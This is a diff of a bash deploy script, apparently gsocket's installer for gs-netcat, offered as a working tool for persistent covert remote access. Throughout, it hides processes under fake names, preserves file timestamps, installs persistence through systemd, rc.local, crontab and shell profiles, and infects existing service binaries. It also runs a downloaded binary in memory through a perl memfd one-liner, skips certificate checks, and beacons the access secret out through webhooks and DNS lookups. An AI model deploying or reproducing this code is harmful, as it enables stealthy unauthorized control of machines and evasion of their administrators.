+	echo "${sfdata}" >"${SERVICE_FILE}" || return 255
+
+	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
+	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
+
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}"; return; } # did not work... 
+
+	IS_SYSTEMD=1
+	IS_SYSTEMD_STANDALONE=1
+	((IS_INSTALLED+=1))
+	OK_OUT
+}
+
+install_systemd_new() {
+	local sfdata
+	local param
+
+	if [[ "$GS_SYSTEMD_PERSIST" == *"oneshot"* ]]; then
+		sfdata="[Unit]
+After=network.target
+
+[Service]
+Type=oneshot
+RemainAfterExit=no
+ExecStart=${DSTBIN}
+
+[Install]
+WantedBy=multi-user.target"
+		param="-ilqD"
+		GS_CCG=1 # Change CGROUP
+	else 
+		# HERE: the default is a systemd supervised service
+		sfdata="[Unit]
+After=network.target
+
+[Service]
+Restart=always
+RestartSec=300
+ExecStart=${DSTBIN}
+
+[Install]
+WantedBy=multi-user.target"
+		param="-ilq"
+		SYSTEMD_INSTALL_CHECK_IS_ACTIVE=1
+	fi
+
+	install_systemd_add "$sfdata" "$param"
+}
+
+# infect cron.services et.al.
+install_systemd_infect() {
+	local name="$1"
+	local bin="$2"
+	local str
+	local ret
+
+	printf "%-70.70s" "Infecting ${bin}....................................................................."
+
+	# Bail is target service is in a bad state
+	# [[ ! -f "$svfile" ]] && { FAIL_OUT "File not found: ${svfile}"; return 255; }
+	systemctl is-active "$name" &>/dev/null || { SKIP_OUT "${CDC}systemctl status $name${CN} is reporting a bad state."; return 255; }
+
+	infect_bin "$bin"
+	ret=$?
+	[[ $ret -eq 200 ]] && { IS_SYSTEMD=1; IS_GS_RUNNING=1; }  # Dont do any crontab infection
+	[[ $ret -ne 0 ]] && return 255
+
+	SYSTEMD_INFECTED_NAME="${name}"
+	INFECTED_BIN_NAME="${bin}"
+	GS_SYSTEMD_ARGV_MATCH="${INFECT_SYSTEMD_ARGV_MATCH}"
+	IS_SYSTEMD=1
+	((IS_INSTALLED+=1))
+	OK_OUT "Experimental. Set GS_NOINFECT=1 to disable."
+	# FIXME: It would be better if I do this BEFORE installing the service or otherwise we can not
+	# recover if this fails:
+	do_config2bin "${DSTBIN}" "${bin}" "-liq" "" || return 255
+
+	STARTING_STR="Starting gs-netcat as infected ${CB}${name}.service${CN}${CDC}${CN}"
+}
+
+install_system_systemd()
+{
+	local i
+	[[ ! -d "${SERVICE_DIR}" ]] && return 255
+	command -v systemctl >/dev/null || return 255
+	[[ -n "$IS_INSTALLED" ]] && return 0
+
+	# test for:
+	# 1. offline
+	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
+	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return 255
+
+	if [[ -n $GS_INFECT ]]; then
+		i=0
+		while [[ -z $IS_INSTALLED ]] && [[ $i -lt ${#INFECT_BIN_NAME_ARR[@]} ]]; do
+			install_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECT_BIN_NAME_ARR[$i]}"
+			((i++))
+		done
+		[[ -n "$IS_INSTALLED" ]] && {
+			xrm "${DSTBIN}"
+			unset DSTBIN
+			unset DSTBIN_EXEC_ARR
+			return 0
+		}
+	fi
+
+	install_systemd_new
+	[[ -n "$IS_INSTALLED" ]] && return 0
+
+	return 255
+}
+
+# inject a string ($2-) into the 2nd line of a file and retain the
+# PERM/TIMESTAMP of the target file ($1)
+install_to_file() {
+	local fname="$1"
+	local D out
+
+	shift 1
+
+	# If file does not exist then create with oldest TS
+	mk_file "$fname" || return
+
+	while [ $# -gt 0 ]; do
+		[ -n "$1" ] && out+="$1"$'\n'
+		shift 1
+	done
+
+	D="$(head -n1 "${fname}" && \
+		echo -n "${out}" && \
+		tail -n +2 "${fname}")"
+	echo "$D" >"${fname}" 2>/dev/null || return
+
+	true
+}
+
+install_system_rclocal()
+{
+	[[ ! -f "${RCLOCAL_FILE}" ]] && return
+	# Some systems have /etc/rc.local but it's not executeable...
+	[[ ! -x "${RCLOCAL_FILE}" ]] && return
+	echo -en "Installing access /etc/rc.local......................................."
+
+	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
+		return	
+	fi
+
+	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
+	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
+
+	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"
+
+	((IS_INSTALLED+=1))
+	OK_OUT
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" "${PROC_HIDDEN_NAME}" || return 255
+}
+
+install_system()
+{
+	# Try systemd first
+	install_system_systemd && return
+
+	# Try good old /etc/rc.local
+	install_system_rclocal || { 
+		echo -en "Installing systemwide remote access permanentally....................."
+		FAIL_OUT "no systemctl or /etc/rc.local"
+		return
+	}
+}
+
+install_user_crontab()
+{
+	command -v crontab >/dev/null || return # no crontab
+	echo -en "Installing access via crontab........................................."
+	[ -z "$CRONTAB_LINE" ] && { SKIP_OUT; return ; }
+	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already installed in crontab."
+		return
+	fi
+
+	[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
+
+	local old
+	# Create empty crontab (busybox) if no crontab exists at all.
+	old="$(crontab -l 2>/dev/null)" || crontab - </dev/null &>/dev/null
+
+	[ -n "$old" ] && old+=$'\n'
+	[ -n "${NOTE_DONOTREMOVER}" ] && old+="${NOTE_DONOTREMOVE}"$'\n'
+
+	echo -e "${old}0 * * * * $CRONTAB_LINE" | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }
+
+	((IS_INSTALLED+=1))
+	OK_OUT
+}
+
+install_user_profile()
+{
+	local rc_filename_status
+	local rc_file
+	local rc_filename
+
+	rc_filename="$1"
+	rc_filename_status="${rc_filename}................................"
+	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"
+
+	echo -en "Installing access via ~/${rc_filename_status:0:15}..............................."
+	if [[ -f "${rc_file}" ]] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already installed in ${rc_file}"
+		return
+	fi
+
+	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}" || { SKIP_OUT "${CDR}Permission denied:${CN} ~/${rc_filename}"; false; return; }
+
+	((IS_INSTALLED+=1))
+	OK_OUT
+}
+
+install_user()
+{
+	# Use crontab if it's not in systemd (but might be in rc.local).
+	[[ $OSNAME != "osx" ]] && install_user_crontab
+
+	[[ $IS_INSTALLED -lt 2 ]] && {
+		# install_user_profile
+		for x in "${RC_FN_LIST[@]}"; do
+			install_user_profile "$x"
+		done
+	}
+
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" "${PROC_HIDDEN_NAME}" || return 255
+}
+
+ask_nocertcheck() {
+	# Assume NOCERTCHECK if we can not ask.
+	[ ! -t 0 ] && return
+
+	echo -e >&2 "--> ${CY}WARNING: ${CN}Can not verify host. CA Bundle is not installed."
+	echo >&2 "--> Attempting without certificate verification."
+	echo >&2 "--> Press any key to continue or CTRL-C to abort..."
+	echo -en >&2 "--> Continuing in "
+	local n
+
+	n=10
+	while :; do
+		echo -en >&2 "${n}.."
+		n=$((n-1))
+		[[ $n -eq 0 ]] && break 
+		read -r -t1 -n1 && break
+	done
+	[[ $n -gt 0 ]] || echo >&2 "0"
+}
+
+# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
+# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
+dl_ssl() {
+	local cmd sslerr arg_nossl ret
+	cmd="$3"
+	sslerr="$2"
+	arg_nossl="$1"
+
+	shift 3
+	unset DL_ERR
+	if [[ -z $GS_NOCERTCHECK ]]; then
+		{ DL_ERR="$("$cmd" "$@" 2>&1 >&3 3>&-)"; } 3>&1 && unset DL_ERR
+		ret=$?
+		[ -z "$DL_ERR" ] && return 0
+		# ret=77 is curl (77) Problem with the SSL CA cert (path? access rights?)
+		# ret=35 is wget (35) SSL connect error
+		[ $ret -ne 35 ] && [ $ret -ne 77 ] && [[ "${DL_ERR}" != *"$sslerr"* ]] && return 0
+	fi
+
+	FAIL_OUT "Certificate Error."
+	# This will either continue or die by Ctrl-C (user)
+	[[ -z $GS_NOCERTCHECK ]] && ask_nocertcheck
+
+	echo -en "--> Downloading binaries without certificate verification............."
+	{ DL_ERR="$("$cmd" "$arg_nossl" "$@" 2>&1 >&3 3>&-)"; } 3>&1 && unset DL_ERR
+	[ -z "$DL_ERR" ] && return 0
+}
+
+# Download $1 and save it to $2 ($2 can be empty to output to stdout)
+dl() {
+	# Debugging / testing. Use local package if available
+	local unpack="cat"
+
+	[[ "$1" == *".gz" ]] && unpack="gunzip"
+	command -v "$unpack" >/dev/null || errexit "Need $unpack. Try ${CM}apt install $unpack${CN}"
+
+	[ -n "$GS_USELOCAL_GSNC" ] && {
+		[ ! -f "$GS_USELOCAL_GSNC" ] && FAIL_OUT "GS_USELOCAL_GSNC set but file ${CDG}$GS_USELOCAL_GSNC${CN} does not exists..."
+		xcp "$GS_USELOCAL_GSNC" "${2}" && return
+		FAIL_OUT "copy failed..."
+		errexit
+	}
+	if [ -n "$GS_USELOCAL" ]; then
+		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null | "$unpack" && return
+		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null | "$unpack" && return
+		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null | "$unpack" && return
+		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1}). Try setting GS_USELOCAL_GSNC="
+		errexit
+	fi
+
+	# Delete. Maybe previous download failed.
+	[ -n "$2" ] && [ -s "$2" ] && rm -f "${2:?}"
+
+	if [[ -n $IS_USE_CURL ]]; then
+		# curl: (77) Problem with the SSL CA cert (path? access rights?)
+		# curl: (..) ???
+		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2:--}" | "$unpack"
+	elif [[ -n $IS_USE_WGET ]]; then
+		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2:--}" | "$unpack"
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "CAN NOT HAPPEN"
+		errexit
+	fi
+
+	[ -z "$DL_ERR" ] && return
+	FAIL_OUT
+	echo "$DL_ERR"
+	exit_code 255
+}
+
+gs_access_fail_exit() {
+	echo >&1 -e "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
+	echo >&1 -e "--> ${CR}To install use one of the following:${CN}"
+	echo >&1 -e "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
+	echo >&1 -e "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+
+	exit 61
+}
+
+# S= was set. Do not install but execute in place.
+gs_access() {
+	local ret
+	GS_SECRET="${S}"
+
+	GS_CONFIG_READ=0 GS_SECRET="${GS_SECRET}" "${DSTBIN_EXEC_ARR[@]}" -i
+	ret=$?
+
+	# no need to use xrm/xrmdir because TS was recorded already on creation.
+	[ -f "${DSTBIN:?}" ] && rm -f "${DSTBIN:?}"
+	[ -n "$_IS_DSTDIR_CREATED" ] && rmdir "${DSTBIN%/*}"
+
+	[[ $ret -eq 0 ]] && exit_code 0
+	[[ $ret -eq 61 ]] && gs_access_fail_exit
+	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
+	[[ $ret -eq 61 ]] && gs_access_fail_exit
+
+	exit_code "$ret"
+}
+
+gs_access_memexec() {
+	local ret cmd_str
+
+	command -v perl >/dev/null || return
+	[ -d "/proc/$$/fd" ] || return
+	[ -n "$GS_MEMEXEC" ] || return
+
+	if [ -n "$GS_USELOCAL_GSNC" ]; then
+		cmd_str="cat $GS_USELOCAL_GSNC"
+	elif [[ -n $IS_USE_CURL ]]; then
+		cmd_str="curl -SsfL ${URL_BIN}/${SRC_PKG}"
+	elif [[ -n $IS_USE_WGET ]]; then
+		cmd_str="wget ${URL_BIN}/${SRC_PKG} -O -"
+	fi
+
+	DEBUGF "Attempting memexec on $SRC_PKG"
+	GS_CONFIG_READ=0 GS_SECRET="$S" GS_ARGS="-i" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);open($p,"-|","'"${cmd_str}"'");print$o(<$p>);exec{"/proc/$$/fd/$f"}gs-netcat,@ARGV' -- "${ORIG_ARGS[@]}" && exit
+	ret="$?"
+	[ $ret -eq 61 ] && { GS_SECRET="${S}"; gs_access_fail_exit; }
+	WARN "Could not execute in memory. Try ${CDC}GS_NOMEMEXEC=1${CN}."
+}
+
+# Binary is in an executeable directory (no noexec-flag)
+# set IS_TESTBIN_OK if binary worked.
+# test_bin <binary>
+test_dstbin()
+{
+	local ret
+	unset IS_TESTBIN_OK
+
+	# Try to execute the binary
+	unset ERR_LOG
+	GS_OUT=$(GS_CONFIG_READ=0 "${DSTBIN_EXEC_ARR[@]}" -g 2>/dev/null)
+	ret=$?
+	[[ -z "$GS_OUT" ]] && {
+		# 126 - Exec format error
+		FAIL_OUT
+		ERR_LOG="$(GS_CONFIG_READ=0 "${DSTBIN_EXEC_ARR[@]}" -g 2>&1 1>/dev/null)"
+		WARN_EXECFAIL_SET "$ret" "wrong binary"
+		return
+	}
+
+	# Use randomly generated secret unless it's set already (X=)
+	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
+
+	IS_TESTBIN_OK=1
+}
+
+test_network()
+{
+	local ret
+	unset IS_TESTNETWORK_OK
+
+	# There should be no GS-NETCAT listening.
+	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-netcat try the connection.
+	# 1. Exit=0 immediatly if server exists.
+	# 2. Exit=202 after n seconds. Firewalled/DNS?
+	# 3. Exit=203 if TCP to GSRN is refused.
+	# 3. Exit=61 on GS-Connection refused. (server does not exist)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_CONFIG_READ=0 GS_SECRET="${GS_SECRET:?}" GS_ARGS="-t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN_EXEC_ARR[@]}" 2>&1)
+	ret=$?
+
+	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
+	[[ $ret -eq 139 ]] && { 
+		ERR_LOG=""
+		WARN_EXECFAIL_SET "$ret" "SIGSEGV"
+		return
+	}
+
+	{ [[ $ret -eq 202 ]] || [[ $ret -eq 203 ]]; } && {
+		# 202 - Timeout (alarm)
+		# 203 - TCP connection refused
+		FAIL_OUT
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+		# EXIT if we can not check if SECRET has already been used.
+		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 25, 67 or 7350."
+	}
+
+	# Pre <= 1.4.40 return with 255 if transparent proxy resets connection after 12 sec.
+	# >1.4.40 return 203 (NETERROR)
+	[[ $ret -eq 255 ]] && {
+		# Connect reset by peer
+		FAIL_OUT
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+		errexit "A transparent proxy has been detected. Try GS_PORT=53 or 22,7350 or 67."
+	}
+
+	[[ $ret -eq 0 ]] && {
+		FAIL_OUT "Secret '${GS_SECRET}' is already used."
+		HOWTO_CONNECT_OUT
+		exit_code 0
+	}
+
+	# Fail _unless_ it's ECONNREFUSED
+	[[ $ret -eq 61 ]] && {
+		# HERE: ECONNREFUSED
+		# Connection to GSRN was successfull and GSRN reports
+		# that no server is listening.
+		# This is a good enough test that this network & binary is working.
+		IS_TESTNETWORK_OK=1
+		return
+	}
+
+	# Unknown error condition
+	WARN_EXECFAIL_SET "$ret" "default pkg failed"
+}
+
+do_webhook()
+{
+	local arr
+	local IFS
+	local str
+
+	IFS=""
+	# Expand any $SECRET variable, etc.
+	while [[ $# -gt 0 ]]; do
+		# We need to escape all " to "'"'" to pass 'eval' correctly.
+		# (Note: This _WILL_ expand $-style variables - what we want)
+		# shellcheck disable=SC2001 # Use bash.4.0 features =>  not portable
+		# str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
+		str="${1//\"/\"'\"'\"}"
+        eval str=\""$str"\"
+		arr+=("$str")
+		shift 1
+	done
+
+	# echo "arr=${#arr[@]}: ${arr[@]}"
+	"${arr[@]}"
+}
+
+show_install_config() {
+	local str
+	[[ -n $INFECTED_BIN_NAME ]] && echo -e "Infected: ${CDG}${INFECTED_BIN_NAME}${CN}"
+	[[ -n $DSTBIN ]]            && echo -e "Binary  : ${CDG}${CF}${DSTBIN%/*}/${CN}${CDG}${DSTBIN##*/}${CN} ${CF}[GS_BIN= to change]${CN}"
+	[[ -n $GS_HOST ]]           && echo -e "Relay   : ${CDG}${GS_HOST}:${GS_PORT:-443}${CN}"
+	[[ -z $SYSTEMD_INFECTED_NAME ]] && [[ -n $PROC_HIDDEN_NAME ]] && {
+		echo -e "Name    : ${CDG}${PROC_HIDDEN_NAME}${CN} ${CF}[GS_NAME= to change]${CN}"
+	}
+
+	[[ -n $IS_SYSTEMD_STANDALONE ]] && echo -e "Service : ${CDG}${SERVICE_HIDDEN_NAME}.service${CN} ${CF}[GS_SERVICE= to change]${CN}"
+	str="always connected ${CN}${CF}[GS_BEACON=30 to change]"
+	[[ -n $GS_BEACON ]] && str="every $GS_BEACON minutes"
+	echo -e "Beacon  : ${CDG}${str}${CN}"
+}
+
+webhooks() {
+	local arr
+	local ok
+	local err
+
+	echo -en "Executing webhooks...................................................."
+	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
+	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
+
+	if [[ -n $IS_USE_CURL ]]; then
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"requested URL returned error: 404"* ]] && ok=1
+	elif [[ -n $IS_USE_WGET ]]; then
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"ERROR 404: Not Found"* ]] && ok=1
+	fi
+	[[ -n $ok ]] && { OK_OUT; return; }
+
+	FAIL_OUT
+}
+
+dnshook() {
+	echo -en "Executing DNS-hook...................................................."
+	[[ -z "$GS_DNSHOOK" ]] && { SKIP_OUT; return; }
+
+	if command -v getent >/dev/null; then
+		timeout 2 getent hosts "${GS_SECRET}.${GS_DNSHOOK}" &>/dev/null
+	elif command -v dig >/dev/null; then
+	 	timeout 2 dig +short "${GS_SECRET}.${GS_DNSHOOK}" &>/dev/null
+	elif command -v host >/dev/null; then
+	 	timeout 2 host "${GS_SECRET}.${GS_DNSHOOK}" &>/dev/null
+	elif command -v nslookup >/dev/null; then
+	 	timeout 2 nslookup "${GS_SECRET}.${GS_DNSHOOK}" &>/dev/null
+	else
+		FAIL_OUT
+		return
+	fi
+	OK_OUT
+}
+
+try_network()
+{
+	echo -en "Testing Global Socket Relay Network..................................."
+	[ -n "$GS_NOTEST" ] && { SKIP_OUT; return; }
+	test_network
+	[[ -n "$IS_TESTNETWORK_OK" ]] && { OK_OUT; return; }
+
+	FAIL_OUT
+	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+	WARN_EXECFAIL
+	errexit
+}
+
+# install <osarch> <srcpackage>
+install() {
+	local osarch="${1:?}"
+	local src_pkg="${2:?}"
+
+	echo -e "--> Trying ${CG}${osarch}${CN}"
+	# Download binaries
+	echo -en "Downloading binaries.................................................."
+	mk_file "${DSTBIN:?}" || { FAIL_OUT; errexit; }
+	dl "${src_pkg}" "${DSTBIN}"
+
+	if [[ -n "$LDSO" ]]; then
+		chmod 600 "$DSTBIN"
+	else
+		chmod 711 "$DSTBIN"
+	fi
+	OK_OUT
+
+	echo -en "Testing binaries......................................................"
+	# [ -n "$GS_SECRET" ] && [ -n "$GS_NOTEST" ] && { IS_TESTBIN_OK=1; SKIP_OUT; return; }
+	test_dstbin
+
+	if [[ -n "$IS_TESTBIN_OK" ]]; then
+		OK_OUT
+		return
+	fi
+}
+
+gs_start_systemd()
+{
+	local err
+	# HERE: It's systemd
+	[[ -n "$IS_GS_RUNNING" ]] && {
+		SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
+		return
+	}
+
+	[[ -n "$SYSTEMD_INFECTED_NAME" ]] && {
+		systemctl restart "$SYSTEMD_INFECTED_NAME" &>/dev/null
+		if ! systemctl is-active "${SYSTEMD_INFECTED_NAME}" &>/dev/null; then
+			FAIL_OUT "Check ${CM}systemctl status ${SYSTEMD_INFECTED_NAME}${CN}."
+			exit_code 255
+		fi
+		IS_GS_RUNNING=1
+		OK_OUT
+		return
+	}
+
+	# Resetting the Timestamp will yield a systemctl status warning that daemon-reload
+	# is needed. Thus fix Timestamp first and then reload.
+	ts_restore
+	systemctl daemon-reload
+	err=1
+	systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null && {
+		if [[ -n "$SYSTEMD_INSTALL_CHECK_IS_ACTIVE" ]]; then
+			systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null && unset err
+		else
+			# Hope for the best that OneShot worked correctly.
+			unset err
+		fi
+	}
+	[[ -n "$err" ]] && {
+		FAIL_OUT "Check ${CM}systemctl status ${SERVICE_HIDDEN_NAME}${CN}."
+		exit 255
+	}
+	IS_GS_RUNNING=1
+	OK_OUT
+	return
+}
+
+gs_start()
+{
+	local old_pid
+	local err
+	[[ -n $IS_GS_RUNNING ]] && return
+
+	local len=70
+	[[ -n "$CDC" ]] && ((len+=22)) 
+	printf "%-${len}.${len}s" "$(echo -e "${STARTING_STR}.....................................................")"
+	if [[ -n "$GS_NOSTART" ]]; then
+		SKIP_OUT "${CDC}GS_NOSTART=1${CN} is set."
+		return
+	fi
+
+	# If installed as systemd then try to start it
+	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
+	[[ -n "$IS_GS_RUNNING" ]] && return
+
+	# Scenario to consider:
+	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-dbus'
+	# ./deploy.sh -> re-installs new secret. Start gs-dbus with _new_ secret.
+	# Now two gs-dbus's are running (which is correct)
+	if [[ -n "$KL_CMD" ]]; then
+		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${KL_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+	elif command -v pidof >/dev/null; then
+		# if no pkill/killall then try pidof (but we cant tell which user...)
+		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
+			IS_OLD_RUNNING=1
+		fi
+	fi
+
+	[[ -z "$IS_OLD_RUNNING" ]] && {
+		old_pid="$(unset -v GS_CONFIG_READ; GS_SHOW_RUNNING=1 "${DSTBIN_EXEC_ARR[@]}")"
+		[[ -n "$old_pid" ]] && IS_OLD_RUNNING=1
+	}
+
+	if [[ -n "$IS_OLD_RUNNING" ]]; then
+		# HERE: OLD is already running.
+		SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}' [PID $old_pid]."
+		return
+	fi
+
+	err="$(cd "$HOME"; unset -v GS_CONFIG_READ; "${DSTBIN_EXEC_ARR[@]}" 2>&1)" || { FAIL_OUT "${CDC}unset -v GS_CONFIG_READ; ${DSTBIN_EXEC_ARR[*]}${CN}:"; errexit "$err"; }
+	OK_OUT ""
+
+	IS_GS_RUNNING=1
+}
+
+init_vars
+
+[[ "$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
+[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
+
+init_setup
+[[ -n $GS_BRANCH ]] && WARN "Using branch ${CDY}$GS_BRANCH${CN}"
+
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/y)"
+[[ -n "$X" ]] && GS_SECRET_X="$X"
+
+if [[ -z "$S" ]]; then
+	# HERE: S= is NOT set. Exit if already installed.
+	gs_secret_reload
+
+	GS_SECRET="${GS_SECRET_X}"
+fi
+
+
+STARTING_STR="Starting ${CB}${BIN_HIDDEN_NAME}${CN} as hidden process ${CDC}${PROC_HIDDEN_NAME}${CN}"
+install "$OSARCH" "$SRC_PKG"
+
+WARN_EXECFAIL
+[[ -z "$IS_TESTBIN_OK" ]] && errexit "The binary did not work."
+
+[[ -z $S ]] && try_network
+
+# S= is set. Do not install but connect to remote using S= as secret.
+[[ -n "$S" ]] && gs_access
+# -----BEGIN Install permanentally-----
+if [[ -z $GS_NOINST ]]; then
+	if [[ -n $IS_DSTBIN_TMP ]]; then
+		do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilD" "${PROC_HIDDEN_NAME}"
+		echo -en "Installing remote access.............................................."
+		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
+	else
+		# Try to install system wide. This may also start the service.
+		[[ $UID -eq 0 ]] && install_system
+
+		# Try to install to user's login script or crontab (if not installed as SYSTEMD)
+		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
+	fi
+else
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilD" "${PROC_HIDDEN_NAME}"
+	echo -en "Installing remote access.............................................."
+	SKIP_OUT "${CDC}GS_NOINST=1${CN} is set."
+fi
+# -----END Install permanentally-----
+
+if [[ -z "$IS_INSTALLED" ]] || [[ -n $IS_DSTBIN_TMP ]]; then
+	echo -e >&2 "--> ${CR}Access will be lost after reboot.${CN}"
+fi
+	
+[[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
+
+[[ -n "$GS_FFPID" ]] && {
+	unset ok
+	echo -en "Using low PID. May take 60 sec before connecting......................"
+	OK_OUT "Set ${CDC}GS_NOFFPID=1${CN} to disable"
+}
+
+webhooks
+dnshook
+show_install_config
+
+HOWTO_CONNECT_OUT
+
+# Do this after show_install_config so that user always sees the GS_SECRET.
+gs_start
+
+# Give gsnc enough time to read the configuration from its own binary before deleting.
+[[ -n "$GS_NOINST" ]] && { sleep 1; rm -f "${DSTBIN:?}"; }
+
+echo -e "--> ${CW}Join us - https://thc.org/ops${CN}"
+
+# Default values are known and easily detected by users/admins.
+{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "Using default names is easily detectable.\n             Set ${CB}GS_BIN=<filename>${CN} and ${CDC}GS_NAME=<processname>${CN} instead."
+
+exit_code 0
